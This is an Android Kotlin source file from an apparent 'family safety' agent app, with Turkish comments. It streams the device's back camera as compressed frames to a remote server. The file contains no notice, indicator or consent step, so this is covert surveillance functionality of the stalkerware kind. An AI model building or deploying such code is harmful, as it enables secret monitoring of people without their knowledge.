package com.familysafety.agent

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * Camera2 API kullanarak canlı kamera akışı.
 * start() → ImageReader döngüsü başlar, her kare "camera_frame" olarak signal server'a gönderilir.
 * stop()  → Kamera ve ImageReader serbest bırakılır.
 */
object CameraStreamManager {

    private const val TAG = "CameraStreamManager"
    private const val FRAME_INTERVAL_MS = 400L  // ~2.5 FPS
    private const val JPEG_QUALITY = 50

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    @Volatile
    private var streaming = false

    // ── Akış Başlat ───────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    fun startStreaming(context: Context) {
        if (streaming) return
        streaming = true

        handlerThread = HandlerThread("CameraStream").also { it.start() }
        handler = Handler(handlerThread!!.looper)

        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = getBackCamera(manager) ?: run {
            Log.e(TAG, "Kamera bulunamadı")
            streaming = false
            return
        }

        val characteristics = manager.getCameraCharacteristics(cameraId)
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: run {
            Log.e(TAG, "Desteklenen boyut yok")
            streaming = false
            return
        }

        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            if (!streaming) return@setOnImageAvailableListener
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                sendFrame(bytes)
            } catch (e: Exception) {
                Log.e(TAG, "Kare okunamadı: ${e.message}")
                image.close()
            }
        }, handler)

        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                createCaptureSession(camera)
            }
            override fun onDisconnected(camera: CameraDevice) {
                Log.w(TAG, "Kamera bağlantısı kesildi")
                camera.close()
                cameraDevice = null
                streaming = false
            }
            override fun onError(camera: CameraDevice, error: Int) {
                Log.e(TAG, "Kamera hatası: $error")
                camera.close()
                cameraDevice = null
                streaming = false
            }
        }, handler)

        Log.d(TAG, "Kamera akışı başlatılıyor (${size.width}x${size.height})")
    }

    private fun createCaptureSession(camera: CameraDevice) {
        val surface = imageReader!!.surface
        camera.createCaptureSession(
            listOf(surface),
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    scheduleCapture()
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(TAG, "Capture session yapılandırması başarısız")
                    streaming = false
                }
            },
            handler
        )
    }

    private fun scheduleCapture() {
        if (!streaming || captureSession == null) return
        handler?.postDelayed({
            if (!streaming) return@postDelayed
            try {
                val captureRequest = cameraDevice!!
                    .createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                    .apply { addTarget(imageReader!!.surface) }
                    .build()
                captureSession?.capture(captureRequest, null, handler)
            } catch (e: Exception) {
                Log.e(TAG, "Kare yakalama hatası: ${e.message}")
            }
            scheduleCapture()
        }, FRAME_INTERVAL_MS)
    }

    // ── Akış Durdur ───────────────────────────────────────────────────────────

    fun stop() {
        streaming = false
        try {
            captureSession?.close()
            cameraDevice?.close()
            imageReader?.close()
            handlerThread?.quitSafely()
        } catch (e: Exception) {
            Log.e(TAG, "Kamera durdurulurken hata: ${e.message}")
        }
        captureSession = null
        cameraDevice = null
        imageReader = null
        handlerThread = null
        handler = null
        Log.d(TAG, "Kamera akışı durduruldu")
    }

    // ── Kare Gönder ───────────────────────────────────────────────────────────

    private fun sendFrame(jpegBytes: ByteArray) {
        // Büyük kareler için yeniden sıkıştır
        val finalBytes = if (jpegBytes.size > 100_000) {
            val bmp = BitmapFactory.decodeByteArray(jpegBytes, 0, jpegBytes.size)
            val out = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
            bmp.recycle()
            out.toByteArray()
        } else jpegBytes

        val b64 = Base64.encodeToString(finalBytes, Base64.NO_WRAP)
        val payload = JSONObject().apply {
            put("profileId", Config.profileId)
            put("frame", b64)
            put("ts", System.currentTimeMillis())
        }
        SocketManager.emit("camera_frame", payload)
    }

    // ── Yardımcı ─────────────────────────────────────────────────────────────

    private fun getBackCamera(manager: CameraManager): String? {
        for (id in manager.cameraIdList) {
            val facing = manager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING)
            if (facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return manager.cameraIdList.firstOrNull()
    }
}
